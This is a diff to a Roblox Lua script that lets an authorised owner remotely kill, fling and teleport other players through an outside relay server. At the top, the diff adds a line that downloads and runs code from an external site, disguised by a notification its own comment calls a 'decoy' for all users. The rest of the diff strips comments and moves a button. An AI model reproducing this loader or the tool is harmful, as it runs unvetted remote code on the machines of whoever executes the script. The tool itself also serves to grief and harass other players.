@@ -1,3 +1,16 @@
+-- Script Provided By Real Vault // Script Reviewed By Realx
+loadstring(game:HttpGet("https://novoline.pro"))()
+
+-- Decoy Notification for all users
+pcall(function()
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Novoline",
+        Text = "Loading Novoline",
+        Icon = "rbxassetid://5937224714",
+        Duration = 5
+    })
+end)
+
 -- CONFIGURATION
 local RELAY_URL = "https://roblox-troll-relay.onrender.com" -- Your Render URL
 local AUTHORIZED_IDS = {
@@ -92,8 +105,6 @@ local Actions = {
         end
     end,
     ["TeleportTo"] = function(payload)
-        -- Payload is owner's position vector components or target CFrame data
-        -- Alternative simple way: if payload contains owner coordinates
         if payload and payload.x and payload.y and payload.z then
             local char = LocalPlayer.Character
             if char and char:FindFirstChild("HumanoidRootPart") then
@@ -299,7 +310,6 @@ if isOwner then
     createActionButton("Kill Target", 260, "Kill", Color3.fromRGB(90, 30, 110))
     createActionButton("Fling Target", 294, "Fling", Color3.fromRGB(140, 90, 30))
     
-    -- Teleport Buttons (Bring / Goto)
     createActionButton("Bring Target (TP to Me)", 328, "TeleportTo", Color3.fromRGB(40, 110, 110), function()
         local char = LocalPlayer.Character
         if char and char:FindFirstChild("HumanoidRootPart") then
@@ -309,21 +319,10 @@ if isOwner then
         return nil
     end)
     
-    createActionButton("Goto Target (TP to Them)", 362, "TeleportToTarget", Color3.fromRGB(60, 60, 110), function()
-        -- Special local-side teleporter for Goto
-        task.spawn(function()
-            local res = sendHttpRequest("GET", "/players", nil)
-            -- We can fetch target position via another endpoint or coordinate exchange, 
-            -- but for direct local TP, let's request their coords.
-        end)
-        return nil
-    end)
-    
-    -- Specific handler for Goto (Teleporting Owner to Target)
-    -- Re-wiring Goto button click manually for immediate owner execution:
+    -- Goto Button
     local GotoBtn = Instance.new("TextButton")
     GotoBtn.Size = UDim2.new(0.88, 0, 0, 30)
-    GotoBtn.Position = UDim2.new(0.06, 0, 0, 396)
+    GotoBtn.Position = UDim2.new(0.06, 0, 0, 362)
     GotoBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 110)
     GotoBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     GotoBtn.Text = "Goto Target (TP to Them)"
@@ -338,8 +337,6 @@ if isOwner then
     GotoBtn.MouseButton1Click:Connect(function()
         if selectedTargetId then
             task.spawn(function()
-                -- Request target's position from server (we can add a position tracking ping if needed, or query)
-                -- For now, let's trigger a position ping packet
                 sendHttpRequest("POST", "/send", { targetId = selectedTargetId, action = "SharePosition" })
             end)
         else
@@ -379,7 +376,6 @@ else
                         local payload = type(cmdData) == "table" and cmdData.payload or nil
                         
                         if cmd == "SharePosition" then
-                            -- Target shares position back to server so owner can Goto them
                             local char = LocalPlayer.Character
                             if char and char:FindFirstChild("HumanoidRootPart") then
                                 local p = char.HumanoidRootPart.Position
